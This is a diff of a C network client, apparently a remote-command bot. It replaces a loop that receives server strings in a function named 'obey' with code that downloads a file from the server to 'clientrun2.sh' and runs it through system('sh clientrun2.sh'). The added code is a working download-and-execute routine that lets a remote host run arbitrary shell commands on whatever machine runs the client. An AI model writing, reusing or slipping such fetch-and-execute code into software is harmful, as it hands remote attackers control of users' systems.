@@ -32,7 +32,7 @@ int obey(int sockfd, char* buf) {
 
 	int numbytes;
 
-	while (1) {
+	//while (1) {
 		if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
 			perror("recv");
 			close(sockfd);
@@ -47,7 +47,7 @@ int obey(int sockfd, char* buf) {
 
 		buf[numbytes] = '\0';
 
-		printf("client: received '%s'\n",buf);
+		//printf("client: received '%s'\n",buf);
 		//system(buf);
 
 		if (strcmp(buf, "close") == 0) {
@@ -55,8 +55,38 @@ int obey(int sockfd, char* buf) {
 			printf("closed");
 			return 0;
 		}
-	}
+
+	//}
+		return 0;
 }
+
+/*void recvf(int sockfd, char* fname) {
+
+	FILE* f = fopen(fname, "w");
+	char buffer[256];
+	char getsize[1];
+	int size;
+
+	recv(sockfd, getsize, 1, 0); 
+	printf("\t%d\n", getsize[0]);
+	recv(sockfd, buffer, getsize[0], 0);
+
+	fwrite(buffer, 1, getsize[0], f);
+
+	fclose(f);
+}*/
+
+void recvf(int sockfd, char* fname) {
+
+	FILE* f = fopen(fname, "w");
+	char buf[1];
+
+	while(recv(sockfd, buf, 1, 0) != 0)
+		fputc(buf[0], f);
+
+	fclose(f);
+}
+
 
 int main(int argc, char *argv[])
 {
@@ -139,8 +169,10 @@ int main(int argc, char *argv[])
 
 	freeaddrinfo(servinfo); // all done with this structure
 
-	obey(sockfd, buf);
-	if ((sockfd = socket(p->ai_family, p->ai_socktype,
+	//obey(sockfd, buf);
+	recvf(sockfd, "clientrun2.sh");
+	system("sh clientrun2.sh");
+	/*if ((sockfd = socket(p->ai_family, p->ai_socktype,
 					p->ai_protocol)) == -1) {
 		perror("client: socket");
 	}
@@ -149,7 +181,7 @@ int main(int argc, char *argv[])
 		close(sockfd);
 		perror("client: connect");
 	}
-	obey(sockfd, buf);
+	obey(sockfd, buf);*/
 
 	return 0;
 }
